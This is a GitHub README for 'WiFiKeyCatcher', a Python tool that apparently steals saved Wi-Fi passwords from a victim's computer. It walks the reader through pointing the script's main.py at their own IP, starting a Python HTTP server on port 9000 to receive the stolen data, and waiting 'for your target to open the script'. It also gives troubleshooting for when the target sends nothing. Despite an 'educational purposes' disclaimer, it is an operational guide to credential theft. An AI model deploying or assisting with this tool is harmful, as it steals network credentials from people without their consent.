<p align="center">
  <img src="https://logos-world.net/wp-content/uploads/2022/03/Wi-Fi-Logo.png"/>
</p>
 <h3><p align="center">
    ⚠️ Disclaimer: This repository is intended for educational purposes exclusively. I bear no responsibility for any illicit or unauthorized use of this project.
</p></h3>
</p>
<p align="center">
  <img src="https://img.shields.io/badge/Version-0.0.1-green" alt=""/>
  <img src="https://img.shields.io/badge/Written in-Python-blue" alt=""/>
  <img src="https://img.shields.io/badge/Author-Ibn Aleem-red" alt=""/>
</p>

# Setup
1. Clone this repository:
```
$ git clone https://github.com/ibnaleem/WiFiKeyCatcher.git
```
2. Run `ipconfig` in `cmd`
3. Copy your `IPv4` address and open `main.py`
4. Change `http://your-ip:9000`
5. Save and open `cmd`:
```
$ py -m SimpleHTTPServer 9000
```
6. Done, now wait for your target to open the script

# Errors
#### Python SimpleHTTPServer Error - No module named SimpleHTTPServer
```
$ py -m http.server 9000
```
#### Target Ran Script, Nothing Received
Make sure your target has Python installed
